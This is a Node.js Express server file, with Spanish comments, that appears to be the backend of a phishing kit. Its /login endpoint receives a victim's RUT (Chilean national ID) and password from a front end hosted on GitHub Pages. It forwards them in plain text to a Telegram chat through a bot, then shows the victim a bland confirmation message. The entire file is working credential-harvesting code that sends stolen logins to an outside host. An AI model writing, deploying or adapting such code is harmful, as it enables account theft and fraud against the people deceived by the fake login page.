const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();

// Habilitar CORS para permitir llamadas desde GitHub Pages
app.use(cors());

// Middleware para parsear JSON
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Credenciales desde variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post("/login", async (req, res) => {
  const { rut, passwd } = req.body;

  const mensaje = `Nuevo intento de login:\nRUT: ${rut}\nContraseña: ${passwd}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Hemos recibido tu solicitu.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
  }
});

// Render asigna automáticamente el puerto
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));

